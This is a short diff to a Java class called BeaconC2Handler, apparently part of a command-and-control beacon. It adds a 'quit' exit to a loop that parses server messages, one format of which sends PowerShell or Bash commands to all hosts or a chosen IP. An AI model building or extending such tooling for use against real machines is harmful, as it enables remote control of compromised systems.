@@ -77,6 +77,9 @@ public class BeaconC2Handler implements Runnable{
                 String message = C2Server.receive();
                 System.out.println(message);
                 String[] tokens = message.split(" ");
+                if(tokens[0].equals("quit")){
+                    break;
+                }
                 if(tokens[0].equals("Command")){
                     // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address] [Powershell/Bash command to be run]"
                     if(tokens[2].equals("All")){
